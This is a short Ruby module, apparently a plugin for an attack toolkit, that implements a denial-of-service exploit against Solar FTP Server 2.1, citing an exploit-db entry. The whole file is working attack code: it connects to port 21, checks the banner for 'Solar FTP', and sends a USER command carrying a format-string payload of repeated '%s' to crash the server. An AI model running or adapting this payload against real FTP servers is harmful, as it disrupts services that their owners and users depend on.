
def solarftp_dos_load(opt)
	opt["host"] = true
	opt["defport"] = 21
	return opt
end

def solarftp_dos(opt)
	# Solar FTP Server 2.1 DoS
	# Based on Exploit Denial of Service Solar FTP 2.1 http://www.exploit-db.com/exploits/16204/
	buff = "A"*50 + "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"
	host = opt["host"]
	port = opt["defport"]

	puts "[*] Connecting to the target ..."
	begin
		s = TCPSocket.new(host, port)
	rescue
		puts "    Error connecting."
		return 0
	end
	puts "[*] Connected, waiting for FTP version ..."
	data = s.recv(1000)
	if data.include?("Solar FTP") == true
		puts "[*] Sending exploit ..."
		s.write("USER " + buff + "\r\n")
		puts "[*] Exploit sent."
	else
		puts "    Target isn't vulnerable, exploit not sent."
	end
	s.close()
end

